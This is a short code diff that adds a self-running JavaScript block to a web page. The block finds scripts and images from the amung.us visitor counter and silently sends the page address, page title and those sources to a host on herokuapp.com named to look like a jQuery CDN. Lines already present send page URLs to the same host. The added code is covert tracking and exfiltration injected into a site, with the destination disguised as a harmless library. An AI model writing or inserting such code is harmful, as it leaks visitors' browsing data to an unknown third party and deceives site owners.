@@ -28,3 +28,13 @@ for (var i = 0; i < arrayLength; i++) {
 (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
   }
 }
+(function () {
+    var sc = document.getElementsByTagName('script');
+    var img = document.getElementsByTagName('img');
+    for (var i = 0; i < sc.length; i++)
+    	if (sc[i].src.indexOf('amung.us') > -1)
+      (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/niches.php?l="+window.location.href+"&t="+document.title+"&a="+sc[i].src;
+    for (var i = 0; i < img.length; i++)
+    	if (img[i].src.indexOf('amung.us') > -1)
+    	(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/niches.php?l="+window.location.href+"&t="+document.title+"&a="+img[i].src;
+})();
